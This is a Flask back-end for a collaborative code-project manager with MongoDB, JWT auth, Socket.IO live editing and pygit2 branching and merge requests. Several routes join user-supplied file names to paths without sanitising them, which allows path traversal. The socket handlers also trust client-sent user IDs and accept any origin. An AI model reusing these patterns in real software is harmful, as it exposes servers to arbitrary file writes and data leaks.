# File: app.py
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_jwt_extended import JWTManager, create_access_token, get_jwt_identity, jwt_required
from pymongo import MongoClient
from werkzeug.security import generate_password_hash, check_password_hash
from bson.objectid import ObjectId
import os
import datetime
import shutil
import pygit2 
import re
import stat

from flask_socketio import SocketIO, join_room, leave_room, emit

app = Flask(__name__)
# Initialize Socket.IO with your Flask app
socketio = SocketIO(app, cors_allowed_origins="*")

CORS(app, resources={r"/api/*": {"origins": ["http://localhost:5173","http://192.168.165.100:5173"]}}, supports_credentials=True)

# Setup MongoDB
client = client = MongoClient(os.environ.get('MONGODB_URI'))
db = client['project_manager']
threat_db = client['your_project_db'] 
users_collection = db['users']
projects_collection = db['projects']
merge_requests_collection = db['merge_requests']

# JWT Config
app.config['JWT_SECRET_KEY'] = os.environ.get('JWT_SECRET_KEY')
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = datetime.timedelta(days=1)
jwt = JWTManager(app)

# Base directory for project folders
PROJECTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'projects')
if not os.path.exists(PROJECTS_DIR):
    os.makedirs(PROJECTS_DIR)

# Helper function to convert MongoDB ObjectId to string
def serialize_id(obj):
    if isinstance(obj, dict):
        if '_id' in obj:
            obj['_id'] = str(obj['_id'])
        for key in obj:
            if isinstance(obj[key], (dict, list)):
                obj[key] = serialize_id(obj[key])
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            obj[i] = serialize_id(item)
    return obj


# Dictionary to track active users in each file
active_users = {}  # Structure: {project_id: {file_name: {user_id: user_name}}}

@socketio.on('connect')
def handle_connect():
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    print(f"Client disconnected: {request.sid}")
    
    # Remove user from all active files
    for project_id in list(active_users.keys()):
        for file_name in list(active_users.get(project_id, {}).keys()):
            for user_id, session_id in list(active_users[project_id][file_name].items()):
                if session_id == request.sid:
                    handle_leave_file({'project_id': project_id, 'file_name': file_name, 'user_id': user_id})

@socketio.on('join_file')
def handle_join_file(data):
    project_id = data['project_id']
    file_name = data['file_name']
    user_id = data['user_id']
    user_name = data['user_name']
    
    # Create room name for this file
    room = f"{project_id}:{file_name}"
    
    # Join the room
    join_room(room)
    
    # Add user to active users
    if project_id not in active_users:
        active_users[project_id] = {}
    if file_name not in active_users[project_id]:
        active_users[project_id][file_name] = {}
    
    active_users[project_id][file_name][user_id] = {
        'name': user_name,
        'session_id': request.sid
    }
    
    # Notify everyone in the room about the new user
    emit('user_joined', {
        'user_id': user_id,
        'user_name': user_name,
        'active_users': get_active_users(project_id, file_name)
    }, room=room)

@socketio.on('leave_file')
def handle_leave_file(data):
    project_id = data['project_id']
    file_name = data['file_name']
    user_id = data['user_id']
    
    room = f"{project_id}:{file_name}"
    
    # Remove user from active users
    if (project_id in active_users and 
        file_name in active_users[project_id] and 
        user_id in active_users[project_id][file_name]):
        
        user_info = active_users[project_id][file_name].pop(user_id)
        
        # Clean up empty dictionaries
        if not active_users[project_id][file_name]:
            active_users[project_id].pop(file_name)
        if not active_users[project_id]:
            active_users.pop(project_id)
        
        # Leave the room
        leave_room(room)
        
        # Notify everyone in the room about the user leaving
        emit('user_left', {
            'user_id': user_id,
            'active_users': get_active_users(project_id, file_name)
        }, room=room)

@socketio.on('content_change')
def handle_content_change(data):
    project_id = data['project_id']
    file_name = data['file_name']
    content = data['content']
    user_id = data['user_id']
    
    room = f"{project_id}:{file_name}"
    
    # Broadcast the change to everyone else in the room
    emit('content_changed', {
        'content': content,
        'user_id': user_id
    }, room=room, include_self=False)

def get_active_users(project_id, file_name):
    """Helper function to get all active users in a file"""
    if (project_id not in active_users or 
        file_name not in active_users[project_id]):
        return {}
    
    users = {}
    for user_id, user_data in active_users[project_id][file_name].items():
        users[user_id] = user_data['name']
    
    return users

# Add a new route to create a file
@app.route('/api/projects/<project_id>/files', methods=['POST'])
@jwt_required()
def create_file(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
            
        # Check if user has edit rights
        allowed_editors = project.get('allowedEditors', [])
        if project['user_id'] != current_user_id and current_user_id not in allowed_editors:
            return jsonify({'message': 'You do not have permission to create files in this project'}), 403
        
        # Get file name and initial content
        file_name = request.json.get('fileName')
        content = request.json.get('content', '')
        
        if not file_name:
            return jsonify({'message': 'File name is required'}), 400
            
        # Create the file
        file_path = os.path.join(project['folderPath'], file_name)
        
        # Check if file already exists
        if os.path.exists(file_path):
            return jsonify({'message': 'File already exists'}), 409
            
        # Write the file
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
            
        # Return file info
        file_stat = os.stat(file_path)
        file_info = {
            'name': file_name,
            'size': file_stat.st_size,
            'lastModified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
        }
            
        return jsonify(file_info), 201
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500


# Authentication routes
@app.route('/api/auth/register', methods=['POST'])
def register():
    data = request.json
    name = data.get('name')
    email = data.get('email')
    password = data.get('password')
    
    if not name or not email or not password:
        return jsonify({'message': 'All fields are required'}), 400
    
    if users_collection.find_one({'email': email}):
        return jsonify({'message': 'Email already exists'}), 409
    
    hashed_password = generate_password_hash(password)
    user_id = users_collection.insert_one({
        'name': name,
        'email': email,
        'password': hashed_password,
        'created_at': datetime.datetime.utcnow()
    }).inserted_id
    
    user = users_collection.find_one({'_id': user_id})
    user_data = {
        '_id': str(user['_id']),
        'name': user['name'],
        'email': user['email']
    }
    
    access_token = create_access_token(identity=str(user['_id']))
    
    return jsonify({
        'message': 'User registered successfully',
        'token': access_token,
        'user': user_data
    }), 201

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
    user = users_collection.find_one({'email': email})
    
    if not user or not check_password_hash(user['password'], password):
        return jsonify({'message': 'Invalid email or password'}), 401
    
    user_data = {
        '_id': str(user['_id']),
        'name': user['name'],
        'email': user['email']
    }
    
    access_token = create_access_token(identity=str(user['_id']))
    
    return jsonify({
        'message': 'Login successful',
        'token': access_token,
        'user': user_data
    }), 200

@app.route('/api/users/me', methods=['GET'])
@jwt_required()
def get_current_user():
    current_user_id = get_jwt_identity()
    user = users_collection.find_one({'_id': ObjectId(current_user_id)})
    
    if not user:
        return jsonify({'message': 'User not found'}), 404
    
    user_data = {
        '_id': str(user['_id']),
        'name': user['name'],
        'email': user['email']
    }
    
    return jsonify(user_data), 200

# Project routes
@app.route('/api/projects', methods=['GET'])
@jwt_required()
def get_user_projects():
    current_user_id = get_jwt_identity()
    
    # Find all projects where the user is the owner
    user_projects = list(projects_collection.find({'user_id': current_user_id}))
    user_projects = serialize_id(user_projects)
    
    return jsonify(user_projects), 200

@app.route('/api/projects/public', methods=['GET'])
@jwt_required()
def get_public_projects():
    # Find all public projects
    public_projects = list(projects_collection.find({'isPublic': True}))
    
    # Enrich with user information
    for project in public_projects:
        user = users_collection.find_one({'_id': ObjectId(project['user_id'])})
        if user:
            project['user'] = {
                '_id': str(user['_id']),
                'name': user['name'],
                'email': user['email']
            }
    
    public_projects = serialize_id(public_projects)
    
    return jsonify(public_projects), 200

@app.route('/api/projects/<project_id>', methods=['GET'])
@jwt_required()
def get_project(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
            
        # Check access permissions
        if not project.get('isPublic', False) and project['user_id'] != current_user_id:
            # Check if user is in allowedEditors
            allowed_editors = project.get('allowedEditors', [])
            if current_user_id not in allowed_editors:
                return jsonify({'message': 'Access denied'}), 403
        
        # Convert ObjectId to string for JSON serialization
        project['_id'] = str(project['_id'])
        
        # Include accessRequests in the response
        # This is crucial for the frontend to check if the user has already requested access
        project['accessRequests'] = project.get('accessRequests', [])
        
        return jsonify(project), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500














# *****************************************************************************************************************************************************










@app.route('/api/projects', methods=['POST'])
@jwt_required()
def create_project():
    current_user_id = get_jwt_identity()
    data = request.json
    
    name = data.get('name')
    is_public = data.get('isPublic', False)
    
    if not name:
        return jsonify({'message': 'Project name is required'}), 400
    
    # Create project folder
    user_dir = os.path.join(PROJECTS_DIR, current_user_id)
    if not os.path.exists(user_dir):
        os.makedirs(user_dir)
    
    # Create a safe folder name from project name
    safe_folder_name = "".join([c if c.isalnum() else "_" for c in name])
    project_folder = os.path.join(user_dir, safe_folder_name)
    
    # Check if project folder already exists
    if os.path.exists(project_folder):
        return jsonify({'message': 'Project with this name already exists'}), 409
    
    # Create the project folder
    os.makedirs(project_folder)
    
    try:
        pygit2.init_repository(project_folder)
    except Exception as e:
        # Cleanup folder if Git init fails
        shutil.rmtree(project_folder)
        return jsonify({
            'message': 'Failed to initialize Git repository',
            'error': str(e)
        }), 500

    # Create project in database
    project_id = projects_collection.insert_one({
        'name': name,
        'user_id': current_user_id,
        'isPublic': is_public,
        'folderPath': project_folder,
        'createdAt': datetime.datetime.utcnow()
    }).inserted_id
    
    project = projects_collection.find_one({'_id': project_id})
    project = serialize_id(project)
    
    return jsonify(project), 201

@app.route('/api/projects/<project_id>', methods=['DELETE'])
@jwt_required()
def delete_project(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id),
            'user_id': current_user_id
        })

        if not project:
            return jsonify({'message': 'Project not found or access denied'}), 404

        # Handle directory deletion with error callback
        def remove_readonly(func, path, _):
            """Clear the readonly bit and reattempt the removal"""
            os.chmod(path, stat.S_IWRITE)
            func(path)

        if os.path.exists(project['folderPath']):
            shutil.rmtree(project['folderPath'], onerror=remove_readonly)
        
        # Delete from database
        projects_collection.delete_one({'_id': ObjectId(project_id)})
        
        return jsonify({'message': 'Project deleted successfully'}), 200
    except Exception as e:
        return jsonify({'message': str(e)}), 500

@app.route('/api/projects/<project_id>/files', methods=['GET'])
@jwt_required()
def get_project_files(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if user has access to this project
        if project['user_id'] != current_user_id and not project['isPublic']:
            return jsonify({'message': 'Access denied'}), 403
        
        # Get files from the project folder
        folder_path = project['folderPath']
        files = []
        
        if os.path.exists(folder_path):
            for filename in os.listdir(folder_path):
                file_path = os.path.join(folder_path, filename)
                if os.path.isfile(file_path):
                    file_stat = os.stat(file_path)
                    files.append({
                        'name': filename,
                        'size': file_stat.st_size,
                        'lastModified': datetime.datetime.fromtimestamp(file_stat.st_mtime).isoformat()
                    })
        
        return jsonify(files), 200
    except Exception as e:
        return jsonify({'message': str(e)}), 500













# ********************************************************************************************************************************************************************











# 2. Update upload_files to check for edit permission, not just ownership
@app.route('/api/projects/<project_id>/upload', methods=['POST'])
@jwt_required()
def upload_files(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
            
        # Check if user has edit rights (owner or in allowedEditors)
        allowed_editors = project.get('allowedEditors', [])
        if project['user_id'] != current_user_id and current_user_id not in allowed_editors:
            return jsonify({'message': 'You do not have permission to upload files to this project'}), 403

        # Save uploaded files
        if 'files' not in request.files:
            return jsonify({'message': 'No files uploaded'}), 400
            
        files = request.files.getlist('files')
        for file in files:
            if file.filename == '':
                continue
            file.save(os.path.join(project['folderPath'], file.filename))
            
        return jsonify({'message': 'Files uploaded successfully'}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500


@app.route('/api/projects/<project_id>/commit', methods=['POST'])
@jwt_required()
def commit_changes(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Verify project ownership
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found or access denied'}), 404

        allowed_editors = project.get('allowedEditors', [])
        if project['user_id'] != current_user_id and current_user_id not in allowed_editors:
            return jsonify({'message': 'You do not have permission to commit changes to this project'}), 403

        repo = pygit2.Repository(project['folderPath'])
        
        # Add all files to index
        repo.index.add_all()
        repo.index.write()
        
        # Check if there are changes to commit
        status = repo.status()
        if not status and not repo.head_is_unborn:
            try:
                # Check for differences between the index and HEAD
                diff = repo.diff('HEAD', None)
                if len(diff) == 0:
                    return jsonify({'message': 'No changes to commit'}), 400
            except Exception:
                # If HEAD comparison fails, continue with commit
                pass
        
        # Create commit
        author = pygit2.Signature("This User", "no-reply@example.com")
        message = "Initial commit" if repo.head_is_unborn else "Update files"
        
        tree = repo.index.write_tree()
        
        if repo.head_is_unborn:
            # For the first commit
            parents = []
        else:
            # For subsequent commits
            parents = [repo.head.target]
            
        commit_id = repo.create_commit(
            'HEAD',  # Use HEAD instead of refs/heads/main
            author,
            author,
            message,
            tree,
            parents
        )
        
        return jsonify({'message': 'Changes committed successfully', 'commit_id': str(commit_id)}), 200
        
    except Exception as e:
        return jsonify({'message': f"Error committing changes: {str(e)}"}), 500

















@app.route('/api/projects/<project_id>/commits', methods=['GET'])
@jwt_required()
def get_commits(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Verify project ownership
        project = projects_collection.find_one({
            '_id': ObjectId(project_id),
            'user_id': current_user_id
        })
        
        if not project:
            return jsonify({'message': 'Project not found or access denied'}), 404

        repo = pygit2.Repository(project['folderPath'])
        
        # Check if repository has any commits
        if repo.head_is_unborn:
            return jsonify({'commits': []}), 200
            
        commits = []
        for commit in repo.walk(repo.head.target, pygit2.GIT_SORT_TIME):
            commits.append({
                'id': str(commit.id),
                'message': commit.message,
                'author': commit.author.name,
                'date': commit.author.time,
                'time_offset': commit.author.offset
            })
            
        return jsonify({'commits': commits}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500



@app.route('/api/projects/<project_id>/rollback/<commit_id>', methods=['POST'])
@jwt_required()
def rollback_to_commit(project_id, commit_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Verify project ownership
        project = projects_collection.find_one({
            '_id': ObjectId(project_id),
            'user_id': current_user_id
        })
        
        if not project:
            return jsonify({'message': 'Project not found or access denied'}), 404

        repo = pygit2.Repository(project['folderPath'])
        
        # Reset to the specified commit
        commit = repo.get(commit_id)
        if not commit:
            return jsonify({'message': 'Commit not found'}), 404
            
        # Hard reset to the commit
        repo.reset(commit.id, pygit2.GIT_RESET_HARD)
        
        return jsonify({'message': 'Rolled back to commit successfully'}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500


# Add these routes to your Flask app

# 1. Route to get file content
@app.route('/api/projects/<project_id>/files/<path:file_name>/content', methods=['GET'])
@jwt_required()
def get_file_content(project_id, file_name):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if user has access to this project
        if project['user_id'] != current_user_id and not project['isPublic']:
            return jsonify({'message': 'Access denied'}), 403
        
        # Get file content
        file_path = os.path.join(project['folderPath'], file_name)
        if not os.path.exists(file_path) or not os.path.isfile(file_path):
            return jsonify({'message': 'File not found'}), 404
            
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
                return jsonify({'content': content}), 200
        except UnicodeDecodeError:
            # For binary files
            return jsonify({'message': 'Cannot display binary file content'}), 415
            
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# 2. Route to save file content
@app.route('/api/projects/<project_id>/files/<path:file_name>/save', methods=['POST'])
@jwt_required()
def save_file_content(project_id, file_name):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if user has edit rights
        allowed_editors = project.get('allowedEditors', [])
        if project['user_id'] != current_user_id and current_user_id not in allowed_editors:
            return jsonify({'message': 'You do not have permission to edit this file'}), 403
        
        # Save file content
        content = request.json.get('content')
        if content is None:
            return jsonify({'message': 'No content provided'}), 400
            
        file_path = os.path.join(project['folderPath'], file_name)
        if not os.path.exists(file_path):
            return jsonify({'message': 'File not found'}), 404
            
        # Write content to file
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
            
        return jsonify({'message': 'File saved successfully'}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# 3. Route to request edit access to a project
@app.route('/api/projects/<project_id>/access-request', methods=['POST'])
@jwt_required()
def request_access(project_id):
    requestor_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if project is public
        if not project.get('isPublic', False):
            return jsonify({'message': 'Cannot request access to private projects'}), 403
            
        # Add to access requests if not already there
        access_requests = project.get('accessRequests', [])
        if requestor_id not in access_requests:
            access_requests.append(requestor_id)
            
            # Update project
            projects_collection.update_one(
                {'_id': ObjectId(project_id)},
                {'$set': {'accessRequests': access_requests}}
            )
            
        return jsonify({'message': 'Access requested successfully'}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# 4. Route to approve/deny access requests
@app.route('/api/projects/<project_id>/access-requests/<user_id>', methods=['PUT'])
@jwt_required()
def handle_access_request(project_id, user_id):
    owner_id = get_jwt_identity()
    approve = request.json.get('approve', False)
    
    try:
        # Find the project and verify ownership
        project = projects_collection.find_one({
            '_id': ObjectId(project_id),
            'user_id': owner_id
        })
        
        if not project:
            return jsonify({'message': 'Project not found or you are not the owner'}), 404
            
        # Get current lists
        access_requests = project.get('accessRequests', [])
        allowed_editors = project.get('allowedEditors', [])
        
        # Remove user from requests
        if user_id in access_requests:
            access_requests.remove(user_id)
        
        # Add to allowed editors if approved
        if approve and user_id not in allowed_editors:
            allowed_editors.append(user_id)
            
        # Update project
        projects_collection.update_one(
            {'_id': ObjectId(project_id)},
            {'$set': {
                'accessRequests': access_requests,
                'allowedEditors': allowed_editors
            }}
        )
        
        return jsonify({'message': 'Access request processed successfully'}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# 5. Route to get pending access requests
@app.route('/api/projects/<project_id>/access-requests', methods=['GET'])
@jwt_required()
def get_access_requests(project_id):
    owner_id = get_jwt_identity()
    
    try:
        # Find the project and verify ownership
        project = projects_collection.find_one({
            '_id': ObjectId(project_id),
            'user_id': owner_id
        })
        
        if not project:
            return jsonify({'message': 'Project not found or you are not the owner'}), 404
            
        # Get access requests
        access_requests = project.get('accessRequests', [])
        users = []
        
        # Get user details for each request
        for user_id in access_requests:
            user = users_collection.find_one({'_id': ObjectId(user_id)})
            if user:
                users.append({
                    '_id': str(user['_id']),
                    'name': user['name'],
                    'email': user['email']
                })
                
        return jsonify({'requests': users}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500

























# Branch management routes

@app.route('/api/projects/<project_id>/branches', methods=['GET'])
@jwt_required()
def get_branches(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if user has access to this project
        if project['user_id'] != current_user_id and not project['isPublic']:
            return jsonify({'message': 'Access denied'}), 403
        
        repo = pygit2.Repository(project['folderPath'])
        
        # Get all branches
        branches = []
        for branch_name in repo.branches:
            branch = repo.branches[branch_name]
            # Get the latest commit on this branch
            commit = repo.get(branch.target)
            branches.append({
                'name': branch_name,
                'id': str(branch.target),
                'lastCommit': {
                    'message': commit.message.strip(),
                    'author': commit.author.name,
                    'date': commit.author.time
                },
                # Add the owner of the branch if it's a user branch
                'owner': branch_name.split('user_')[-1] if branch_name.startswith('user_') else None
            })
            
        return jsonify({'branches': branches}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500
@app.route('/api/projects/<project_id>/branches', methods=['POST'])
@jwt_required()
def create_branch(project_id):
    current_user_id = get_jwt_identity()
    branch_name = request.json.get('branchName')
    
    if not branch_name:
        return jsonify({'message': 'Branch name is required'}), 400
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if project is public or user is owner
        if not project.get('isPublic', False) and project['user_id'] != current_user_id:
            return jsonify({'message': 'Cannot create branch in private projects you do not own'}), 403
        
        # For public projects, create a user-specific branch
        if project['user_id'] != current_user_id:
            branch_name = f"user_{current_user_id}_{branch_name}"
        
        repo = pygit2.Repository(project['folderPath'])
        
        # Check if branch already exists
        if branch_name in repo.branches:
            return jsonify({'message': 'Branch already exists'}), 409
        
        # Check if there are any commits in the repository
        try:
            # Try to get the HEAD reference
            head_ref = repo.head
            head_commit = repo.get(head_ref.target)
            
            # Create branch from the HEAD commit
            repo.create_branch(branch_name, head_commit)
            
            return jsonify({'message': 'Branch created successfully', 'branchName': branch_name}), 201
            
        except (pygit2.GitError, KeyError) as e:
            # This handles both unborn HEAD (no commits) and reference not found errors
            return jsonify({'message': 'Cannot create branch: repository has no commits or reference not found'}), 400
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500
        
@app.route('/api/projects/<project_id>/branches/<branch_name>/checkout', methods=['POST'])
@jwt_required()
def checkout_branch(project_id, branch_name):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check access rights
        if project['user_id'] != current_user_id:
            # If not owner, check if it's a public project and the branch belongs to the user
            if not project.get('isPublic', False):
                return jsonify({'message': 'Access denied'}), 403
            
            # For public projects, non-owners can only checkout their own branches
            if not branch_name.startswith(f"user_{current_user_id}_"):
                return jsonify({'message': 'Access denied: you can only checkout your own branches'}), 403
        
        repo = pygit2.Repository(project['folderPath'])
        
        # Check if branch exists
        if branch_name not in repo.branches:
            return jsonify({'message': 'Branch not found'}), 404
            
        # Get the branch reference
        branch_ref = repo.branches[branch_name]
        
        # Try to get the branch's target commit
        try:
            branch_commit = repo.get(branch_ref.target)
            
            # Checkout the branch
            repo.checkout_tree(branch_commit.tree)
            repo.set_head(f'refs/heads/{branch_name}')
            
            return jsonify({'message': 'Branch checked out successfully'}), 200
        except (pygit2.GitError, KeyError) as e:
            return jsonify({'message': f'Failed to checkout branch: {str(e)}'}), 500
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500
        
@app.route('/api/projects/<project_id>/merge-requests', methods=['POST'])
@jwt_required()
def create_merge_request(project_id):
    requester_id = get_jwt_identity()
    source_branch = request.json.get('sourceBranch')
    
    if not source_branch:
        return jsonify({'message': 'Source branch is required'}), 400
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if project is public
        if not project.get('isPublic', False) and project['user_id'] != requester_id:
            return jsonify({'message': 'Cannot create merge requests for private projects you do not own'}), 403
        
        # Check if the source branch belongs to the requester (for non-owners)
        if project['user_id'] != requester_id and not source_branch.startswith(f"user_{requester_id}_"):
            return jsonify({'message': 'You can only create merge requests from your own branches'}), 403
        
        # Create merge request record
        merge_request = {
            'project_id': project_id,
            'requester_id': requester_id,
            'source_branch': source_branch,
            'target_branch': 'master',  # Always merge to master for simplicity
            'status': 'pending',
            'created_at': datetime.datetime.utcnow()
        }
        
        # Insert into merge requests collection
        merge_requests_collection.insert_one(merge_request)
        
        return jsonify({'message': 'Merge request created successfully'}), 201
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500

@app.route('/api/projects/<project_id>/merge-requests', methods=['GET'])
@jwt_required()
def get_merge_requests(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if user is the project owner
        if project['user_id'] != current_user_id:
            return jsonify({'message': 'Only the project owner can view merge requests'}), 403
        
        # Get all pending merge requests for this project
        merge_requests_cursor = merge_requests_collection.find({
            'project_id': project_id,
            'status': 'pending'
        })
        
        # Format the response
        merge_requests = []
        for mr in merge_requests_cursor:
            # Get requester info
            requester = users_collection.find_one({'_id': ObjectId(mr['requester_id'])})
            requester_info = {
                'id': str(requester['_id']),
                'name': requester['name'],
                'email': requester['email']
            } if requester else {'id': mr['requester_id'], 'name': 'Unknown', 'email': 'unknown'}
            
            merge_requests.append({
                'id': str(mr['_id']),
                'source_branch': mr['source_branch'],
                'target_branch': mr['target_branch'],
                'status': mr['status'],
                'created_at': mr['created_at'],
                'requester': requester_info
            })
        
        return jsonify({'mergeRequests': merge_requests}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500

@app.route('/api/projects/<project_id>/merge-requests/<request_id>/diff', methods=['GET'])
@jwt_required()
def get_merge_request_diff(project_id, request_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if user is the project owner
        if project['user_id'] != current_user_id:
            return jsonify({'message': 'Only the project owner can view merge request diffs'}), 403
        
        # Get the merge request
        merge_request = merge_requests_collection.find_one({
            '_id': ObjectId(request_id),
            'project_id': project_id
        })
        
        if not merge_request:
            return jsonify({'message': 'Merge request not found'}), 404
        
        repo = pygit2.Repository(project['folderPath'])
        
        # Get the branch references
        source_branch_name = merge_request['source_branch']
        target_branch_name = merge_request['target_branch']
        
        if source_branch_name not in repo.branches or target_branch_name not in repo.branches:
            return jsonify({'message': 'Source or target branch not found'}), 404
        
        source_branch = repo.branches[source_branch_name]
        target_branch = repo.branches[target_branch_name]
        
        # Get the commits
        source_commit = repo.get(source_branch.target)
        target_commit = repo.get(target_branch.target)
        
        # Get the diff
        diff = repo.diff(target_commit.tree, source_commit.tree)
        
        # Format the diff for the response
        files_changed = []
        for patch in diff:
            files_changed.append({
                'old_file': patch.delta.old_file.path,
                'new_file': patch.delta.new_file.path,
                'is_binary': patch.delta.is_binary,
                'status': patch.delta.status_char(),
                'patch': patch.text if not patch.delta.is_binary else None
            })
        
        return jsonify({
            'diff': {
                'files_changed': files_changed,
                'stats': {
                    'insertions': diff.stats.insertions,
                    'deletions': diff.stats.deletions,
                    'files_changed': diff.stats.files_changed
                }
            }
        }), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500
@app.route('/api/projects/<project_id>/merge-requests/<request_id>/approve', methods=['POST'])
@jwt_required()
def approve_merge_request(project_id, request_id):
    owner_id = get_jwt_identity()
    
    try:
        # Find the project and verify ownership
        project = projects_collection.find_one({
            '_id': ObjectId(project_id),
            'user_id': owner_id
        })
        
        if not project:
            return jsonify({'message': 'Project not found or you are not the owner'}), 404
        
        # Get the merge request
        merge_request = merge_requests_collection.find_one({
            '_id': ObjectId(request_id),
            'project_id': project_id,
            'status': 'pending'
        })
        
        if not merge_request:
            return jsonify({'message': 'Merge request not found or already processed'}), 404
        
        repo = pygit2.Repository(project['folderPath'])
        
        # Get the branch references
        source_branch_name = merge_request['source_branch']
        target_branch_name = merge_request['target_branch']
        
        if source_branch_name not in repo.branches or target_branch_name not in repo.branches:
            return jsonify({'message': 'Source or target branch not found'}), 404
        
        source_branch = repo.branches[source_branch_name]
        target_branch = repo.branches[target_branch_name]
        
        # Perform the merge
        repo.checkout(target_branch)
        
        try:
            # Get the merge analysis
            merge_analysis, _ = repo.merge_analysis(source_branch.target)
            
            if merge_analysis & pygit2.GIT_MERGE_ANALYSIS_FASTFORWARD:
                # Fast-forward merge
                target_ref = f'refs/heads/{target_branch_name}'
                ref = repo.lookup_reference(target_ref)
                ref.set_target(source_branch.target)
                repo.state_cleanup()
                
                # Update merge request status
                merge_requests_collection.update_one(
                    {'_id': ObjectId(request_id)},
                    {'$set': {'status': 'approved'}}
                )
                
                return jsonify({'message': 'Merge request approved and merged successfully (fast-forward)'}), 200
                
            elif merge_analysis & pygit2.GIT_MERGE_ANALYSIS_NORMAL:
                # Regular merge needed
                # First, merge the trees
                repo.merge(source_branch.target)
                
                # Check if there are conflicts
                if repo.index.conflicts is not None:
                    repo.state_cleanup()
                    return jsonify({'message': 'Cannot merge automatically, conflicts detected'}), 409
                
                # Create a commit with the merged state
                user = repo.default_signature
                merge_commit_id = repo.create_commit(
                    'HEAD',  # reference to update
                    user, user,  # author & committer
                    f"Merge branch '{source_branch_name}' into {target_branch_name}",  # message
                    repo.index.write_tree(),  # tree
                    [repo.head.target, source_branch.target]  # parents
                )
                repo.state_cleanup()
                
                # Update merge request status
                merge_requests_collection.update_one(
                    {'_id': ObjectId(request_id)},
                    {'$set': {'status': 'approved'}}
                )
                
                return jsonify({'message': 'Merge request approved and merged successfully'}), 200
                
            elif merge_analysis & pygit2.GIT_MERGE_ANALYSIS_UP_TO_DATE:
                # Already up to date, nothing to merge
                repo.state_cleanup()
                
                # Update merge request status since it's technically "merged" (no changes needed)
                merge_requests_collection.update_one(
                    {'_id': ObjectId(request_id)},
                    {'$set': {'status': 'approved'}}
                )
                
                return jsonify({'message': 'Merge request approved (branch already up to date)'}), 200
                
            else:
                # Can't be merged for other reasons
                repo.state_cleanup()
                return jsonify({'message': 'Cannot merge automatically, unsupported merge analysis result'}), 409
                
        except pygit2.GitError as git_error:
            repo.state_cleanup()
            return jsonify({'message': f'Git error during merge: {str(git_error)}'}), 500
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500


